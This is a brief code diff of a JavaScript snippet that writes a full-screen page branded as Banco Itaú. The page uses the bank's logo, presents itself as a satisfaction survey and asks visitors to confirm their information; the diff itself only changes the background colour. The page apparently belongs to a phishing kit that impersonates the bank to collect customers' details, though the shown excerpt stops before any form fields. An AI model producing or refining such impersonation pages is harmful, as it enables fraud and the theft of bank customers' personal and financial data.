@@ -1,5 +1,5 @@
 document.write(`
-  <body style="margin:0;font-family:sans-serif;background:#b30000;color:white;display:flex;justify-content:center;align-items:center;flex-direction:column;height:100vh;text-align:center">
+  <body style="margin:0;font-family:sans-serif;background:#0033cc;color:white;display:flex;justify-content:center;align-items:center;flex-direction:column;height:100vh;text-align:center">
     <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Ita%C3%BA_Unibanco_logo_2023.svg" style="width:80px;margin-bottom:20px">
     <h1>Pesquisa de Satisfação - Banco Itaú</h1>
     <p>Para continuar, confirme suas informações abaixo:</p>
